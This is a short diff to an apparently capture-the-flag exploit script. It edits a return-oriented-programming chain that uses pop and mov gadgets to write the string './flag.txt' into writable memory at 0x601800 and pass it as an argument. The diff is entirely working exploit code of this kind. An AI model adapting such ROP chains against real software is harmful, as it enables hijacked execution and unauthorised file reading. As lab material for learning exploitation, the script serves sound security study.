@@ -42,7 +42,11 @@ def main():
         buffer,
         pop_r14_pop_r15,
         0x601800,
-        0x67616C662F,
+        0x742E67616C662F2E,
+        mov_Ir14I_r15,
+        pop_r14_pop_r15,
+        0x601808,
+        0x7478,
         mov_Ir14I_r15,
         pop_rdi,
         0x601800,
@@ -56,5 +60,6 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 ```
